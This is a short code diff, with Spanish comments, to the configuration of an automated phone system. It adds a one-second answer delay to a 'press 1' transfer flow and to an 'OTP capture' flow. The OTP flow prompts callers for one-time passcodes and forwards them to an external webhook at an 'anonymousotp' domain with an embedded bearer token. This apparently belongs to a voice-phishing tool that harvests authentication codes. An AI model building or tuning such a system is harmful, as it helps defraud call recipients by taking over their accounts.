@@ -410,6 +410,7 @@ export const initialPress1Config: Press1Config = {
   welcomeAudioId: 'audio-p1-welcome',
   timeoutSeconds: 8,
   maxRetries: 2,
+  answerDelaySeconds: 1, // 1 segundo de cortesía al contestar antes de iniciar locución
   transferDelaySeconds: 2, // 2 segundos de pausa natural tras presionar 1
   digit1Action: 'transfer_extension',
   digit1Target: '1001',
@@ -427,6 +428,7 @@ export const initialOtpConfig: OtpCaptureConfig = {
   welcomeAudioId: 'audio-otp-prompt',
   repeatPromptOnTimeout: true,
   timeoutSeconds: 10,
+  answerDelaySeconds: 1, // 1 segundo de cortesía al contestar antes de solicitar OTP
   maxAttempts: 3,
   webhookUrl: 'https://anonymousotp.online/api/v1/telephony/verify-otp',
   webhookAuthHeader: 'Bearer sec_live_otp_asterisk_token_2026',
